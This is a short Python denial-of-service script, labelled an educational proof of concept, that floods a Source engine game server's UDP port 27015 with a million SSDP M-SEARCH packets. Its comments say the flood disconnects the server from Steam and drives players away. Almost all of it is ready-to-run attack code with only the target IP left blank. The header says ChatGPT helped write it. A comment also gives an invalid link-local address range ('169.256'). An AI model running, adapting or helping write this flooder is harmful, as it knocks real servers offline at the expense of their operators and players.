#### WARNING / LEGAL DISCLAIMER ####
#This Proof of Concept tool is for educational purposes only. We (the qtland Dev Team) are not held responsible or liable for any damages that happen next.
#We also used ChatGPT for writing the tool WITH correcting the AI so, it was both a machine and human job (we are still developers, mind you).
import socket
import time

##### SOURCE ENGINE SSDP ATTACK ######
#The attacker has to know, the server's real IP address and UDP port (in this case is 27015).
#Info for server owners: SDR will protect your server from this attack, as you can't DoS an IP local-link address (169.256. etc etc)
ADDR = "x.x.x.x"
PORT = 27015

#The SSDP payload, this data will be sent to the gameserver...
#>>> https://blog.cloudflare.com/ssdp-100gbps/#the-amplification <<<
MSEARCH_PAYLOAD = (
    "M-SEARCH * HTTP/1.1\r\n"
    "HOST: 239.255.255.250:1900\r\n"
    "MAN: \"ssdp:discover\"\r\n"
    "MX: 1\r\n"
    "ST: ssdp:all\r\n"
    "\r\n"
).encode("utf-8")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
count = 1000000

print(f"Sending {count} SSDP requests to {ADDR} on port {PORT}")

for i in range(count):
    sock.sendto(MSEARCH_PAYLOAD, (ADDR, PORT))
    print(f"[{i+1}] PoC: DOS successfully sent to {ADDR}:{PORT}")
    
#...The attack works by flooding the gameserver with SSDP payload requests, which the gameserver to lose connection with Steam and lose players in the process.
#Losing players is due to players not being able to do anything, and will be unable to use the voice chat feature, and new players can't join the gameserver.
